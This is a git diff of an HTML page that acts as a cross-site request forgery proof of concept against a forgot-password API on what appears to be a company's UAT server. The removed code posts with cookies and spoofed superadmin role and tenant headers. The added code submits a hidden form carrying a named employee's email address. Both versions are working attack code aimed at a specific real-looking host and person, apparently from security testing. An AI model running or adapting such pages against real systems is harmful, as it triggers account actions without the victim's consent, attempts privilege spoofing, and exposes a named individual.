@@ -1,40 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CSRF Demo</title>
+  <title>CSRF Demo - Forgot Password</title>
 </head>
 <body>
 
-<h2>CSRF Attack Demo</h2>
+<h1>🔐 CSRF Demo - Forgot Password</h1>
 
-<button onclick="attack()">Trigger CSRF Attack</button>
+<p>This simulates an attacker trying to trigger forgot password.</p>
 
-<pre id="output"></pre>
+<button onclick="launchAttack()">🚨 Trigger CSRF Attack</button>
+
+<form id="csrfForm"
+      action="https://grow-uat.fareye.co/api/tenant/merchants/forgot-password"
+      method="POST"
+      style="display:none;">
+  <input type="hidden" name="email" value="anandita.sharma@getfareye.com">
+</form>
 
 <script>
-async function attack() {
-  try {
-    const res = await fetch("https://grow-uat.fareye.co/api/tenant/merchants/forgot-password", {
-      method: "POST",
-      credentials: "include", // tries to send cookies
-      headers: {
-        "Content-Type": "application/json",
-        "role": "superadmin",
-        "tenant": "couriersplease",
-        "userType": "superadmin"
-      },
-      body: JSON.stringify({
-        email: "anandita.sharma@getfareye.com"
-      })
-    });
-
-    const text = await res.text();
-    document.getElementById("output").innerText =
-      "Status: " + res.status + "\n\nResponse:\n" + text;
-
-  } catch (err) {
-    document.getElementById("output").innerText = "Error:\n" + err;
-  }
+function launchAttack() {
+  document.getElementById("csrfForm").submit();
 }
 </script>
 
